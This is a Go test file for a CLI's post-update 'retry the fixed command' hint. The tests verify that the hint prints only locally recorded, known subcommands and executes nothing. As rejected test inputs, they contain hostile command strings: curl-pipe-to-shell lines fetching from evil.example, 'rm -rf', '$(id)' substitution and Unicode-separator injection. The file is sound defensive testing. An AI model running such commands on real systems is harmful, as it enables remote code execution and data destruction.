package cli

import (
	"bytes"
	"context"
	"fmt"
	"io/fs"
	"maps"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/dimipaun/fugaro/internal/blobx"
	"github.com/dimipaun/fugaro/internal/issues"
	"github.com/dimipaun/fugaro/internal/localcfg"
	"github.com/spf13/cobra"
)

// retryRelease is the version the retry offer's tests run as: a release build,
// because a dev build never matches a release that fixed something (D1736).
const retryRelease = "0.121.0"

// retryAt is the instant every record in these tests was written at.
var retryAt = time.Date(2026, 11, 9, 12, 0, 0, 0, time.UTC)

// retryFingerprint is the shape a record's fingerprint has — 64 lowercase hex
// characters — built from one pair repeated, so no literal in this file is the
// hash of anything.
var retryFingerprint = strings.Repeat("ab", 32)

// retryRun is the run stem every record in this file was written by.
const retryRun = "update-20261109120000-4242"

// retryEnv is the world the offer's tests read: private XDG directories (so the
// issue store is a temp dir nobody else's records live in), no coding agent's
// marker, and a release build.
func retryEnv(t *testing.T) {
	t.Helper()
	for _, k := range []string{"XDG_STATE_HOME", "XDG_CONFIG_HOME", "XDG_CACHE_HOME", "HOME"} {
		t.Setenv(k, t.TempDir())
	}
	noAgentSession(t)
	withVersion(t, retryRelease)
}

// retryStore is the issue store of this machine's own state directory: the one
// the offer opens.
func retryStore(t *testing.T) *issues.Store {
	t.Helper()
	s, err := issues.OpenStore(os.Getenv, runtime.GOOS)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

// retryFile is one filed issue in this machine's store: the record this machine
// wrote, at the number the shared store gave it.
func retryFile(t *testing.T, s *issues.Store, number int, command string) issues.Issue {
	t.Helper()
	i := retrySharedIssue(retryRun, "")
	i.Number = number
	i.Uploaded = true
	if command != "" {
		i.FailedCommand = command
	}
	if err := s.Save(i); err != nil {
		t.Fatal(err)
	}
	return i
}

// retryMember is the member string the credential of the machine that filed
// this file's reports answers with, and retryIdentity is that credential as
// Upload takes it: the reporter a shared record carries is the credential's
// member string and never a value the record came with (F3).
const retryMember = "ana@example.test"

func retryIdentity() issues.Identity {
	return issues.Identity{Address: retryMember, Digest: issues.Digest(retryMember), Source: issues.SourceVerified}
}

// retrySharedIssue is the shared store's copy of a report, as the spec that
// fills resolved_in leaves it once a later release fixed the bug (F27, D1731):
// this plan builds no writer of that field and reads it.
func retrySharedIssue(run, resolvedIn string) issues.Issue {
	return issues.Issue{
		LocalID: "local-" + run, Run: run,
		Reporter:      retryMember,
		Created:       retryAt,
		FailedCommand: "fugaro update",
		Class:         issues.ClassFugaro,
		FugaroVersion: "0.120.0",
		OS:            "linux",
		Status:        issues.StatusPending,
		Fingerprint:   retryFingerprint,
		ResolvedIn:    resolvedIn,
		Summary:       "the update stopped half way",
	}
}

// retryRow is one row of the shared store as the offer reads it: the number the
// issue was filed under, its fingerprint (the two together are what makes a
// row this machine's own issue, F8), the release that fixed it, and the command
// the record carries.
func retryRow(number int, resolvedIn, command string) issues.SharedRow {
	return issues.SharedRow{Issue: issues.Issue{Number: number, Fingerprint: retryFingerprint, ResolvedIn: resolvedIn, FailedCommand: command}}
}

// retryLocal is one record of this machine's own store as the offer reads it,
// built the way retryFile builds the file it writes.
func retryLocal(command string) issues.Issue {
	return issues.Issue{Number: 7, Fingerprint: retryFingerprint, FailedCommand: command}
}

// retryRig is the update door the offer hangs off: the options the door was
// built with, and the two writers its output goes to. The door is registered on
// a root, as the released tree registers it, because the offer walks that tree
// to know which commands exist.
func retryRig(t *testing.T) (*cobra.Command, *initOptions, *bytes.Buffer, *bytes.Buffer) {
	t.Helper()
	o := &initOptions{}
	root := NewRootCmd()
	cmd := newUpdateCmdWith(o)
	root.AddCommand(cmd)
	var out, errOut bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&errOut)
	cmd.SetOut(&out)
	cmd.SetErr(&errOut)
	cmd.SetIn(strings.NewReader(""))
	cmd.SetContext(t.Context())
	return cmd, o, &out, &errOut
}

// retryBucket is a shared store this test owns, holding one record of this
// machine's issue with the release at resolvedIn in it, and the bucket the door
// reads it from.
func retryBucket(t *testing.T, resolvedIn string) (*blobx.Bucket, int) {
	t.Helper()
	b, err := blobx.Open(t.Context(), "file://"+t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, resolvedIn), retryIdentity())
	if err != nil {
		t.Fatal(err)
	}
	return b, up.Number
}

// stubRetryBucket replaces the bucket the offer reads the shared store from.
func stubRetryBucket(t *testing.T, fn func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error)) {
	t.Helper()
	old := updateRetryBucket
	updateRetryBucket = fn
	t.Cleanup(func() { updateRetryBucket = old })
}

// retrySharedStore opens the fixture's own runs bucket, which is where the
// issues prefix lives (D1727), and seeds it with a report the release at
// resolvedIn fixed.
func retrySharedStore(t *testing.T, resolvedIn string) issues.Uploaded {
	t.Helper()
	lc, err := localcfg.Load(filepath.Join(os.Getenv("XDG_CONFIG_HOME"), "fugaro", "projects", initProjectName+".yaml"))
	if err != nil {
		t.Fatal(err)
	}
	b, err := blobx.Open(t.Context(), lc.BucketURL())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	up, err := issues.Upload(t.Context(), b, retrySharedIssue("update-20261107183012-48213", resolvedIn), retryIdentity())
	if err != nil {
		t.Fatalf("seeding the shared store: %v", err)
	}
	return up
}

// retryBucketFiles is every file the bucket behind dir holds, by its path
// inside the bucket: a run that wrote an object changed one of them.
func retryBucketFiles(t *testing.T, dir string) map[string]string {
	t.Helper()
	out := map[string]string{}
	err := filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, rerr := filepath.Rel(dir, p)
		if rerr != nil {
			return rerr
		}
		data, rerr := os.ReadFile(p)
		if rerr != nil {
			return rerr
		}
		out[rel] = string(data)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

// TestUpdatePrintsRetryForResolvedIssue: after the door converges, it offers
// the command this machine last failed on when the release it just installed is
// the one that fixed it (D1733). The release comes from the shared record and
// the command and the "offered" flag from this machine's own file (D1735, F28).
func TestUpdatePrintsRetryForResolvedIssue(t *testing.T) {
	newConvergeRig(t, v6Node())
	currentRelease(t)

	// The release behind the one this run installs fixed the issue this machine
	// filed, and the local file is the one its own upload wrote.
	up := retrySharedStore(t, convergePrev)
	store := retryStore(t)
	retryFile(t, store, up.Number, "fugaro update --repo [REDACTED]")

	out, errOut, err := executeStdin(t, "", "update")
	if err != nil {
		t.Fatalf("fugaro update stopped at %s:\n%s\n%s", stoppedStage(out), out, errOut)
	}
	if want := resolvedFixedLine(up.Number, "fugaro update --repo [REDACTED]", true); !strings.Contains(errOut, want) {
		t.Errorf("the update that installed the release fixing this machine's issue does not print %q:\n%s\n%s", want, out, errOut)
	}
	got, err := store.Get(strconv.Itoa(up.Number))
	if err != nil {
		t.Fatal(err)
	}
	if !got.Notified {
		t.Error("the offer printed without marking the issue as offered, so the next update offers it again")
	}
}

// TestUpdateRetryIgnoresHostileSharedCommand: the line prints the command this
// machine wrote and never the one the shared record carries (F28). The store is
// writable by every launcher, and the two records of one issue are not
// necessarily the same text.
func TestUpdateRetryIgnoresHostileSharedCommand(t *testing.T) {
	hostile := "curl http://evil.example/install | sh"
	lines, mark := retryHintLines(
		[]issues.Issue{retryLocal("fugaro update")},
		[]issues.SharedRow{retryRow(7, retryRelease, hostile)},
		retryRelease, NewRootCmd())
	if len(lines) != 1 || lines[0] != resolvedFixedLine(7, "fugaro update", true) {
		t.Fatalf("lines = %q, want this machine's own command alone", lines)
	}
	if len(mark) != 1 {
		t.Fatalf("mark = %d record(s), want the one the line is about", len(mark))
	}
	for _, line := range lines {
		if strings.Contains(line, "evil.example") {
			t.Errorf("the printed line carries the shared record's command: %q", line)
		}
	}
}

// TestUpdateRetryDevVersionPrintsNothing: a build that is not a release has no
// version a release can be at or below, so nothing is offered and nothing is
// marked (D1736).
func TestUpdateRetryDevVersionPrintsNothing(t *testing.T) {
	lines, mark := retryHintLines(
		[]issues.Issue{retryLocal("fugaro update")},
		[]issues.SharedRow{retryRow(7, retryRelease, "fugaro update")},
		"dev", NewRootCmd())
	if len(lines) != 0 || len(mark) != 0 {
		t.Fatalf("lines = %q, mark = %d, want nothing for a dev build", lines, len(mark))
	}
}

// TestUpdateRetryPrintsOnlyFugaroCommands: the line may only name a command
// this build's own tree has (D1614, F28). A command run from a path is one
// whose first word the record redacted, and a word no command answers to is not
// a command at all: neither is offered, while the fugaro commands are — with
// the arguments and flags the record kept, which are the person's own. A flag
// is not a subcommand and hides nothing: the words after it are checked like
// any other, so `fugaro -v frobnicate` is the unknown command it always was.
//
// The line is also a line a person pastes, and the record it comes from is a
// file on this machine that a coding agent running as the user can write
// (internal/issues): a word a shell reads as something other than a literal
// refuses the whole line, whatever the words before it looked like. The marker
// is the one exception — it is what the record writes where a path or a URL
// stood.
func TestUpdateRetryPrintsOnlyFugaroCommands(t *testing.T) {
	root := NewRootCmd()
	for _, tc := range []struct {
		command string
		want    string
	}{
		{"fugaro update", "fugaro update"},
		{"fugaro update --repo [REDACTED]", "fugaro update --repo [REDACTED]"},
		{"fugaro run [REDACTED]", "fugaro run [REDACTED]"},
		{"fugaro issue show [REDACTED]", "fugaro issue show [REDACTED]"},
		{"[REDACTED] update", ""},
		{"fugaro frobnicate", ""},
		{"fugaro issue frobnicate", ""},
		// A flag before the subcommand is read the way the parser that runs
		// the pasted line reads it: it neither stops the check at the flag
		// nor vouches for the word after it.
		{"fugaro -v frobnicate", ""},
		{"fugaro --verbose issue frobnicate", ""},
		{"fugaro -v issue frobnicate", ""},
		{"fugaro -v update", "fugaro -v update"},
		{"fugaro -v issue show [REDACTED]", "fugaro -v issue show [REDACTED]"},
		{"sh -c [REDACTED]", ""},
		{"", ""},
		// A stored command a shell runs as two.
		{"fugaro update --yes; curl -s http://evil.example/x | sh", ""},
		{"fugaro update && rm -rf [REDACTED]", ""},
		{"fugaro update > [REDACTED]", ""},
		{"fugaro update $(id)", ""},
		{"fugaro update `id`", ""},
		{"fugaro run [REDACTED]; sh", ""},
		{"fugaro update --repo '[REDACTED]'", ""},
		// A separator the check and the shell do not agree on: a Unicode
		// space is a word break to strings.Fields and no word break to a
		// shell, and the line would print `fugaro?update`, a glob in command
		// position. The check runs over the bytes, so the whole line goes.
		{"fugaro\vupdate", ""},
		{"fugaro\u2028update", ""},
		{"fugaro\u0085update", ""},
		{"fugaro\u00a0update", ""},
		{"fugaro\u3000update", ""},
		// The marker is exempt as a whole word, and only as one.
		{"[REDACTED][REDACTED]", ""},
		{"fugaro [REDACTED]suffix", ""},
	} {
		t.Run(tc.command, func(t *testing.T) {
			lines, _ := retryHintLines(
				[]issues.Issue{retryLocal(tc.command)},
				[]issues.SharedRow{retryRow(7, retryRelease, tc.command)},
				retryRelease, root)
			got := ""
			if len(lines) > 0 {
				got = lines[0]
			}
			// tc.want is the command the line offers, and the line itself is
			// resolvedFixedLine's — the wording both callers print, pinned by
			// update_resolved_test.go's own test.
			want := ""
			if tc.want != "" {
				want = resolvedFixedLine(7, tc.want, true)
			}
			if got != want {
				t.Errorf("retryHintLines(%q) = %q, want %q", tc.command, got, want)
			}
		})
	}
}

// TestUpdateRetryIgnoresEmptyResolvedIn: the field is empty until the spec that
// writes it fills it in, and a value that is not a release resolves nothing
// either (F27, D1736): both offer nothing.
func TestUpdateRetryIgnoresEmptyResolvedIn(t *testing.T) {
	for _, resolvedIn := range []string{"", "main", "0.121", "next"} {
		lines, mark := retryHintLines(
			[]issues.Issue{retryLocal("fugaro update")},
			[]issues.SharedRow{retryRow(7, resolvedIn, "fugaro update")},
			retryRelease, NewRootCmd())
		if len(lines) != 0 || len(mark) != 0 {
			t.Errorf("resolved_in %q offered %q, want nothing", resolvedIn, lines)
		}
	}
}

// TestUpdateRetryOnlyOwnIssues: the offer is about this machine's own reports.
// Another reporter's issue is a row with no file here, so there is no command
// this machine wrote and nothing to offer (D1733, F28). The two stores are
// joined by number AND fingerprint, because this machine's own file is global
// to it while a number is unique only inside one project's store: a row that
// shares the number but is another issue is not this machine's.
func TestUpdateRetryOnlyOwnIssues(t *testing.T) {
	other := retryRow(9, retryRelease, "fugaro update")
	elsewhere := retryRow(7, retryRelease, "fugaro update")
	elsewhere.Fingerprint = strings.Repeat("cd", 32)
	for _, tc := range []struct {
		what string
		rows []issues.SharedRow
	}{
		{"another reporter's issue", []issues.SharedRow{other}},
		{"the same number under another fingerprint", []issues.SharedRow{elsewhere}},
	} {
		t.Run(tc.what, func(t *testing.T) {
			lines, mark := retryHintLines(
				[]issues.Issue{retryLocal("fugaro update")}, tc.rows,
				retryRelease, NewRootCmd())
			if len(lines) != 0 || len(mark) != 0 {
				t.Fatalf("lines = %q, mark = %d, want nothing for %s", lines, len(mark), tc.what)
			}
		})
	}
}

// TestUpdateRetryOnce: the mark is this machine's own file (D1735), so the
// offer is made once and the update after it is silent.
func TestUpdateRetryOnce(t *testing.T) {
	retryEnv(t)
	store := retryStore(t)
	b, number := retryBucket(t, retryRelease)
	retryFile(t, store, number, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) { return b, nil })

	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o, nil)
	if got := errOut.String(); got != resolvedFixedLine(number, "fugaro update", true)+"\n" {
		t.Fatalf("the first update printed %q, want the one offer", got)
	}
	got, err := store.Get(strconv.Itoa(number))
	if err != nil {
		t.Fatal(err)
	}
	if !got.Notified {
		t.Fatal("the offer was not marked in the local issue file")
	}
	updateRetryHint(cmd, o, nil)
	if got := errOut.String(); got != resolvedFixedLine(number, "fugaro update", true)+"\n" {
		t.Errorf("the second update printed %q, want one offer per issue", got)
	}
}

// TestUpdateRetryMakesNoCloudWrite: the offer reads the shared store and writes
// nothing to it (D1735). The flag that says an issue was offered is this
// machine's own file, so every object in the store is left exactly as it was.
func TestUpdateRetryMakesNoCloudWrite(t *testing.T) {
	retryEnv(t)
	// No checkout, so the config this test writes selects the project alone.
	t.Chdir(t.TempDir())
	dir := t.TempDir()
	t.Setenv("FUGARO_CONFIG", retryConfig(t, "file://"+dir))
	b, err := blobx.Open(t.Context(), "file://"+dir)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, retryRelease), retryIdentity())
	if err != nil {
		t.Fatal(err)
	}
	retryFile(t, retryStore(t), up.Number, "fugaro update")

	before := retryBucketFiles(t, dir)
	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o, nil)
	if want := resolvedFixedLine(up.Number, "fugaro update", true) + "\n"; errOut.String() != want {
		t.Fatalf("the offer printed %q, want %q, so this test proves nothing about what it wrote", errOut.String(), want)
	}
	if after := retryBucketFiles(t, dir); !maps.Equal(before, after) {
		t.Errorf("the offer wrote to the shared store: %d object(s) before, %d after", len(before), len(after))
	}
}

// TestUpdateRetryReadFailureDoesNotFailUpdate: every way the read can fail is a
// line not printed and an update that stands (the hard rule): a project whose
// bucket is unreachable fails nothing, and the door's own PostRunE returns nil
// whatever the offer did.
func TestUpdateRetryReadFailureDoesNotFailUpdate(t *testing.T) {
	retryEnv(t)
	retryFile(t, retryStore(t), 7, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) {
		return nil, fmt.Errorf("the store is unreachable")
	})
	cmd, _, out, errOut := retryRig(t)
	if err := cmd.PostRunE(cmd, nil); err != nil {
		t.Fatalf("a shared-store read failure failed the update: %v", err)
	}
	if out.String() != "" || errOut.String() != "" {
		t.Errorf("the failing read printed %q / %q, want nothing", out.String(), errOut.String())
	}
}

// TestUpdateRetryRunsNothing: the offer prints a command and runs nothing
// (F26). The command word on PATH is a script that would leave a file behind.
func TestUpdateRetryRunsNothing(t *testing.T) {
	retryEnv(t)
	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	script := "#!/bin/sh\n: > '" + marker + "'\n"
	if err := os.WriteFile(filepath.Join(dir, "fugaro"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	store := retryStore(t)
	b, number := retryBucket(t, retryRelease)
	retryFile(t, store, number, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) { return b, nil })

	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o, nil)
	if !strings.Contains(errOut.String(), resolvedFixedLine(number, "fugaro update", true)) {
		t.Fatalf("the offer did not print the command:\n%s", errOut.String())
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("the offer ran the command it printed")
	}
}

// TestUpdateRetryAgentSessionMarksNothing: a coding agent's session reads the
// same line and marks nothing (T-IS19's interfaces): the mark is a write, and a
// session's writes are the person's own (F10).
func TestUpdateRetryAgentSessionMarksNothing(t *testing.T) {
	retryEnv(t)
	store := retryStore(t)
	b, number := retryBucket(t, retryRelease)
	retryFile(t, store, number, "fugaro update")
	stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) { return b, nil })
	t.Setenv(agentMarkers[0], "1")

	cmd, o, _, errOut := retryRig(t)
	updateRetryHint(cmd, o, nil)
	if want := resolvedFixedLine(number, "fugaro update", true) + "\n"; errOut.String() != want {
		t.Fatalf("an agent's session printed %q, want %q", errOut.String(), want)
	}
	got, err := store.Get(strconv.Itoa(number))
	if err != nil {
		t.Fatal(err)
	}
	if got.Notified {
		t.Error("an agent's session marked the issue as offered")
	}
}

// TestUpdateRetryOffersNothingForARunThatAppliedNothing: the guard is the one
// switch that decides whether the offer runs at all, so it is driven here the
// way the offer itself is — over a store that would otherwise print — and each
// mode that applies nothing is named. --non-interactive without --yes is one of
// them by the loop's own rule ("An apply needs --yes; without it the run is
// --plan-only", initflow/loop.go): such a run installed no release, so no
// release fixed anything for it.
func TestUpdateRetryOffersNothingForARunThatAppliedNothing(t *testing.T) {
	for _, tc := range []struct {
		mode string
		set  func(*initOptions)
	}{
		{"--plan-only", func(o *initOptions) { o.planOnly = true }},
		{"--print-vars", func(o *initOptions) { o.printVars = true }},
		{"--config-only", func(o *initOptions) { o.configOnly = true }},
		{"--forget", func(o *initOptions) { o.forget = true }},
		{"--publish-config", func(o *initOptions) { o.publishConfig = true }},
		{"--anchor", func(o *initOptions) { o.anchor = true }},
		{"--non-interactive without --yes", func(o *initOptions) { o.nonInteractive = true }},
	} {
		t.Run(tc.mode, func(t *testing.T) {
			retryEnv(t)
			store := retryStore(t)
			b, number := retryBucket(t, retryRelease)
			retryFile(t, store, number, "fugaro update")
			// The store the offer would read, so the only thing this test can
			// be measuring is the guard.
			stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) { return b, nil })

			cmd, o, _, errOut := retryRig(t)
			tc.set(o)
			updateRetryHint(cmd, o, nil)
			if errOut.String() != "" {
				t.Errorf("%s printed %q, want nothing: the run applied nothing", tc.mode, errOut.String())
			}
			got, err := store.Get(strconv.Itoa(number))
			if err != nil {
				t.Fatal(err)
			}
			if got.Notified {
				t.Errorf("%s marked the issue as offered", tc.mode)
			}
		})
	}
}

// TestUpdateRetryReadsTheCheckoutsStore: `fugaro update --repo PATH` converges
// the checkout at PATH (init.go's runInitRepo), so the offer reads the project
// that checkout names — the working directory's project is not the run's, and
// a machine sitting in another project's checkout would otherwise read its
// store (or, with no checkout there at all, find nothing to offer).
func TestUpdateRetryReadsTheCheckoutsStore(t *testing.T) {
	retryEnv(t)
	// The working directory is a checkout of another project, whose store
	// holds nothing.
	here := t.TempDir()
	gitCheckout(t, here, checkoutsProjectYAML("bramble"))
	t.Chdir(here)
	retryProjectConfig(t, "bramble", "file://"+t.TempDir())

	dir := t.TempDir()
	retryProjectConfig(t, "aurora", "file://"+dir)
	checkout := gitCheckout(t, t.TempDir(), checkoutsProjectYAML("aurora"))
	b, err := blobx.Open(t.Context(), "file://"+dir)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, retryRelease), retryIdentity())
	if err != nil {
		t.Fatal(err)
	}
	store := retryStore(t)
	retryFile(t, store, up.Number, "fugaro update")

	cmd, o, _, errOut := retryRig(t)
	o.repo = true
	updateRetryHint(cmd, o, []string{checkout})
	if want := resolvedFixedLine(up.Number, "fugaro update", true) + "\n"; errOut.String() != want {
		t.Fatalf("fugaro update --repo %s printed %q, want %q", checkout, errOut.String(), want)
	}
	got, err := store.Get(strconv.Itoa(up.Number))
	if err != nil {
		t.Fatal(err)
	}
	if !got.Notified {
		t.Error("the offer printed without marking the issue as offered")
	}
}

// TestUpdateRetrySelectsTheProjectTheRunNamed: `fugaro update --name aurora`
// converges aurora on a machine whose working directory selects no project
// (loadInitConfig's selectNamed), so the offer reads aurora's store and not
// "the only config there is" — the machine that needs --name is the machine
// with several, and there the run's own selection is the only answer.
func TestUpdateRetrySelectsTheProjectTheRunNamed(t *testing.T) {
	for _, tc := range []struct {
		name string
		want string
	}{
		// The project the run named: its store holds the resolved issue.
		{"aurora", "fugaro update"},
		// The other config on the machine: its store holds nothing, so the
		// name is what the offer went by and not the single store it found.
		{"bramble", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			retryEnv(t)
			// No project: the working directory is a checkout that names none,
			// so nothing but --name can select.
			checkoutWithoutOrigin(t)
			dir := t.TempDir()
			retryProjectConfig(t, "aurora", "file://"+dir)
			retryProjectConfig(t, "bramble", "file://"+t.TempDir())
			b, err := blobx.Open(t.Context(), "file://"+dir)
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = b.Close() })
			up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, retryRelease), retryIdentity())
			if err != nil {
				t.Fatal(err)
			}
			retryFile(t, retryStore(t), up.Number, "fugaro update")

			cmd, o, _, errOut := retryRig(t)
			o.name = tc.name
			updateRetryHint(cmd, o, nil)
			want := ""
			if tc.want != "" {
				want = resolvedFixedLine(up.Number, tc.want, true) + "\n"
			}
			if errOut.String() != want {
				t.Fatalf("fugaro update --name %s printed %q, want %q", tc.name, errOut.String(), want)
			}
		})
	}
}

// TestUpdateRetryPassesTheRunsBucketTheRunHad: the door the offer follows
// selected its config with --runs-bucket, applied to it by loadInitConfig, so
// the offer reads that bucket and not the one the config names on its own —
// otherwise `fugaro update --runs-bucket … --yes` would miss the issue the run
// just fixed, or read a bucket the run never converged against. A --repo run
// never applied the flag (loadRepoConfig selects with the checkout's config
// alone), so the offer repeats that too.
func TestUpdateRetryPassesTheRunsBucketTheRunHad(t *testing.T) {
	for _, tc := range []struct {
		name string
		repo bool
		args []string
		want retryProject
	}{
		{
			// The installation door: the flag, which is applied to the
			// selected config before it is converged.
			name: "the installation door",
			want: retryProject{runsBucket: "other"},
		},
		{
			// --repo: the flag is not in loadRepoConfig's selection, so the
			// offer does not apply it either.
			name: "--repo",
			repo: true,
			args: []string{"/checkout"},
			want: retryProject{dir: "/checkout"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			retryEnv(t)
			retryFile(t, retryStore(t), 7, "fugaro update")
			var got retryProject
			b, _ := retryBucket(t, retryRelease)
			stubRetryBucket(t, func(_ context.Context, _ cloudOptions, p retryProject) (*blobx.Bucket, error) {
				got = p
				return b, nil
			})

			cmd, o, _, _ := retryRig(t)
			o.repo = tc.repo
			o.runsBucket = "other"
			updateRetryHint(cmd, o, tc.args)
			if got != tc.want {
				t.Errorf("the offer read the store with %+v, want %+v", got, tc.want)
			}
		})
	}
}

// TestUpdateRetryAppliesTheRunsBucket: the flag reaches the store the offer
// opens, through the real seam and not only through the values it is handed.
// The config names a bucket of its own, so the override contradicts it exactly
// as it does in the converge (loadInitConfig) and the offer prints nothing,
// while the same world without the flag prints the line — which is what makes
// the first half of this table a test of the override rather than of a silence.
// (Which bucket a config that names no bucket at all answers with is
// TestUpdateRetryBucketURL's, since that one is a gs:// URL no test can open.)
func TestUpdateRetryAppliesTheRunsBucket(t *testing.T) {
	for _, tc := range []struct {
		name       string
		runsBucket string
		want       string
	}{
		{"the config's own bucket", "", "fugaro update"},
		{"the bucket the run passed", "other", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			retryEnv(t)
			dir := t.TempDir()
			retryProjectConfig(t, "aurora", "file://"+dir)
			t.Chdir(gitCheckout(t, t.TempDir(), checkoutsProjectYAML("aurora")))
			b, err := blobx.Open(t.Context(), "file://"+dir)
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = b.Close() })
			up, err := issues.Upload(t.Context(), b, retrySharedIssue(retryRun, retryRelease), retryIdentity())
			if err != nil {
				t.Fatal(err)
			}
			retryFile(t, retryStore(t), up.Number, "fugaro update")

			cmd, o, _, errOut := retryRig(t)
			o.runsBucket = tc.runsBucket
			updateRetryHint(cmd, o, nil)
			want := ""
			if tc.want != "" {
				want = resolvedFixedLine(up.Number, tc.want, true) + "\n"
			}
			if errOut.String() != want {
				t.Fatalf("fugaro update --runs-bucket %q printed %q, want %q", tc.runsBucket, errOut.String(), want)
			}
		})
	}
}

// TestUpdateRetryBucketURL: retryBucketURL is the bucket the offer reads, and
// the converge's own reading of --runs-bucket against the selected config
// (loadInitConfig): the flag replaces a config that names no bucket_url, a
// bucket_url that is not it is the refusal the converge makes — two answers to
// one question — and without the flag nothing changes. It is a function of its
// own because the seam it feeds opens a gs:// URL, which no hermetic test can
// reach: the answer is what is checked, not the open.
//
// The last two rows are that same rule seen from the other side: a config
// whose endpoints are fakes answers with no bucket at all, so the seam opens
// nothing real (the e2e upgrade tests run whole installations whose configs
// carry fake endpoints, and the resolved-issues step reads this store).
// skipGSOnFakeEndpoints is off for this package's tests, so the two rows turn
// it on for themselves, exactly as the skip's own tests do.
func TestUpdateRetryBucketURL(t *testing.T) {
	old := skipGSOnFakeEndpoints
	skipGSOnFakeEndpoints = true
	t.Cleanup(func() { skipGSOnFakeEndpoints = old })
	for _, tc := range []struct {
		name       string
		config     localcfg.Config
		runsBucket string
		want       string
	}{
		{"the config's own runs_bucket", localcfg.Config{RunsBucket: "fugaro-runs-old"}, "", "gs://fugaro-runs-old"},
		{"the config's own bucket_url", localcfg.Config{Bucket: "gs://old"}, "", "gs://old"},
		{"the flag, where the config names no bucket", localcfg.Config{}, "new", "gs://new"},
		{"the flag, agreeing with the bucket_url", localcfg.Config{Bucket: "gs://new"}, "new", "gs://new"},
		{"the flag over a runs_bucket", localcfg.Config{RunsBucket: "old"}, "new", "gs://new"},
		{"the flag, contradicting a bucket_url", localcfg.Config{Bucket: "gs://old"}, "new", ""},
		// Unreachable through a selection (localcfg refuses a config with
		// neither), and the guard the seam had before it: one silence more.
		{"no bucket anywhere", localcfg.Config{}, "", ""},
		// A test's or an emulator's installation: its endpoints stand for the
		// gs:// bucket above, so that bucket is not opened for real.
		{"fake endpoints over a runs_bucket", localcfg.Config{RunsBucket: "old", Endpoints: localcfg.Endpoints{NoAuth: true}}, "", ""},
		{"fake endpoints over a bucket_url", localcfg.Config{Bucket: "gs://old", Endpoints: localcfg.Endpoints{Storage: "http://127.0.0.1:1/storage/v1/"}}, "", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			lc := tc.config
			got, err := retryBucketURL(&lc, tc.runsBucket)
			if tc.want == "" {
				// What the flag contradicts is a bucket_url the config does
				// hold, and a config that names no bucket at all is the other
				// silence: neither is an offer.
				if err == nil {
					t.Fatalf("retryBucketURL = %q, want an error", got)
				}
				return
			}
			if err != nil {
				t.Fatalf("retryBucketURL: %v", err)
			}
			if got != tc.want {
				t.Errorf("retryBucketURL = %q, want %q", got, tc.want)
			}
		})
	}
}

// retryProjectConfig writes project name's local config, whose runs bucket is
// the file:// bucket at url, where a selection by the checkout's project: name
// finds it. It is the config a --repo run selects: the project's, not a
// FUGARO_CONFIG of the test's own.
func retryProjectConfig(t *testing.T, name, url string) {
	t.Helper()
	path, err := localcfg.ProjectPath(os.Getenv, name)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	data := "version: 1\nname: " + name + "\ngcp_project: " + name + "-gcp\nregion: us-east5\nruns_bucket: fugaro-runs-" + name + "-gcp\nbucket_url: " + url + "\n"
	if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
		t.Fatal(err)
	}
}

// retryConfig writes a project config whose runs bucket is the file:// bucket
// at url and returns its path, for the tests that read the shared store without
// a whole converge behind them.
func retryConfig(t *testing.T, url string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "retry.yaml")
	if err := os.WriteFile(path, []byte(initConfig+"bucket_url: "+url+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

// uploadAsReporter uploads an issue under the verified identity of its own
// reporter, the way a signed-in member's machine does (issues.Upload takes the
// identity the reporter index is written under).
func uploadAsReporter(ctx context.Context, b *blobx.Bucket, i issues.Issue) (issues.Uploaded, error) {
	return issues.Upload(ctx, b, i, issues.Identity{Address: i.Reporter, Digest: issues.Digest(i.Reporter), Source: issues.SourceVerified})
}
